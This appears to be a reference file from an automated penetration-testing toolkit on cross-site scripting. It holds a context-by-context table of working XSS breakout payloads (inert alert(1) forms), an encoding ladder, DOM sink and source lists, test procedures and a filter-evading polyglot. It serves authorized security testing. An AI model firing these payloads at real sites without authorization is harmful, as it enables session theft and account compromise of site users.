---
name: xss_contexts
description: XSS contexts (CWE-79) (from injection_engine specialist reference library)
---

# XSS contexts (CWE-79)

Context -> breakout matrix, sink list, and procedures. Payloads are canonical
inert `alert(1)`-class forms; replace `alert(1)` with an engagement canary
render where a lighter proof is wanted.

## 1. Context -> breakout matrix

Classify with `scripts/xss_context.py` (marker-based, heuristic). Only use
the breakout row for the classified context.

| Context | How to confirm | Canonical breakouts |
|---|---|---|
| html-body | marker sits between `>` and `<` in markup | `<svg onload=alert(1)>`, `<img src=x onerror=alert(1)>`, `<script>alert(1)</script>` (last resort; CSP often blocks) |
| attribute, double-quoted | marker inside `attr="..."` | `" autofocus onfocus=alert(1) x="`, `" onmouseover=alert(1) x="` |
| attribute, single-quoted | marker inside `attr='...'` | `' autofocus onfocus=alert(1) x='`, `' onmouseover=alert(1) x='` |
| attribute, unquoted | marker is a bare attr value | `onfocus=alert(1) autofocus` (space breaks out of the value) |
| js-string, single-quoted | marker inside `'...'` in script | `'-alert(1)-'`, `';alert(1);//`, `\';alert(1);//` (if quotes are escaped) |
| js-string, double-quoted | marker inside `"..."` in script | `"-alert(1)-"`, `";alert(1);//`, `\";alert(1);//` (if quotes are escaped) |
| js-template | marker inside backticks | `${alert(1)}` |
| js-code (raw) | marker outside string literals | `;alert(1);//` |
| url, scheme position | marker starts an href/src/action value | `javascript:alert(1)//` (works only if the value is used for navigation/script src) |
| url, param position | marker inside `?a=b&...` of a URL attr | `&n=<svg onload=alert(1)>` (URL-encode once or twice per ladder) |
| html-comment | marker inside `<!--...-->` | `--!><svg onload=alert(1)>` |

Notes:
- Escaped-quote contexts (`\'` echoed back): use the backslash-escape row —
  the escaped quote closes nothing, the payload follows.
- If `<` and `>` are HTML-encoded but quotes are not, attribute contexts still
  break out; body context does not. Record which characters survive.

## 2. Encode-decode ladder

raw -> URL-encode once (`%3Csvg...`) -> URL-encode twice -> Unicode/UTF-7
legacy (`%u003C`) -> `%00` termination attempts. Record the rung that
executes; re-test from a clean session for D2.

## 3. DOM sink list (from the crawled JS bundle)

Sinks (write/exec):

- `innerHTML`, `outerHTML`, `insertAdjacentHTML`
- `document.write`, `document.writeln`
- `eval`, `Function(...)`, string-argument `setTimeout(...)`/`setInterval(...)`
- `location`, `location.href`, `location.assign`, `location.replace`
  (including `javascript:` URL assignment)
- jQuery: `$(`userInput`)` selector injection, `.html(payload)`,
  `.append(payload)`, `$(location.hash)` patterns
- Framework-specific: AngularJS client-side template injection in interpolated
  text, Vue `v-html`, React `dangerouslySetInnerHTML`

Sources (read): `location.hash`, `location.search`, `document.referrer`,
`document.URL`, `window.name`, `postMessage` data, `localStorage` values
written by another page/param.

Pair each source->sink path in the finding; a sink with no reachable source
is not a finding.

## 4. Reflected procedure

1. Send a unique canary (`rj-pt-<engagement>-<nonce>`) as the parameter value.
2. Save the response; classify context with `scripts/xss_context.py`.
3. Choose the single breakout row for that context; send the minimal payload.
4. Verify an inert execution marker (alert/canary render); capture the pair.
5. Replay from a clean session for D2; run the false-positive checklist
   (cache-bust, second session, `20`-harness diff).

## 5. Stored procedure

1. Identify storage: profile fields, comments, names, filenames, tickets.
2. Plant the context-matched payload under a test account (never a real user;
  never real user data).
3. View the stored value in every renderer that consumes it (profile page,
  admin list, search result, email preview) — the admin-side render is often
  the unfiltered one.
4. Re-check with a second role (victim context) when the impact claim needs it.
5. Delete the stored payload after D2 and record the deletion in the finding
  (cleanup discipline).

## 6. DOM procedure

1. Map source->sink in the JS bundle (sink list above).
2. Deliver the source value (`location.hash` fragment, `postMessage` with the
   page's expected shape/origin).
3. Prove with an inert marker; headless confirmation belongs to the browser
   automation in the assessment container, screenshot into evidence.
4. `postMessage` without origin checks also routes to
   `55-client-side-attacks` for chaining.

## 7. Polyglot notes

- A polyglot is a last resort when the context is unknown or filtered; it is
  noisy in logs. Prefer classification first.
- Canonical minimal polyglot shape (textbook): a quote/angle-breaking prefix
  plus `onerror`/`onload` handler and a `javascript:` fallback tail, e.g.
  `jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A//</style>
  </script>">` — use only with operator approval, it trips WAFs and pollutes
  logs (note for `85-logging-monitoring`).
- For attribute contexts, polyglots that open a new attribute
  (`autofocus onfocus=`) survive more encoders than tag-openers.

## 8. Limits and handoffs

- CSP (`script-src`) from the P2 baseline caps what executes; state finding
  limits exactly (e.g. "HTML injection, script execution blocked by CSP").
- Session theft / CSRF-chain / OAuth-redirect abuse of an accepted XSS goes to
  `55-client-side-attacks`, not this skill.

